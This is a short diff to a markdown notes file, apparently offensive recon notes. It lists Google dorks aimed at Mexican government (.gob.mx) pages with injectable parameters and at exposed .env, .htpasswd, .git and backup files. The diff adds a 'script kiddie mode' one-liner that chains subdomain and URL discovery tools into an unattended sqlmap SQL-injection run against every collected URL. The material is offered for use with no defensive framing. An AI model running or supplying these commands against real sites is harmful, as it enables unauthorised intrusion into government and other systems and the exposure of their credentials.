@@ -1,12 +1,16 @@
 ## Dorks del padre
 
-````
+````py
 inurl:.page.php?id= site:.gob.mx
 ext:php inurl:? site:.gob.mx
 site:.mx inurl:index.php?page=
 
 ### Juicy Extensions 
 ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess site:example[.]com
+
+### The script kiddie mode SQLmap + subfinder
+subfinder -dL domains.txt | dnsx | waybackurl | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+
 ````
 
 ## Compi
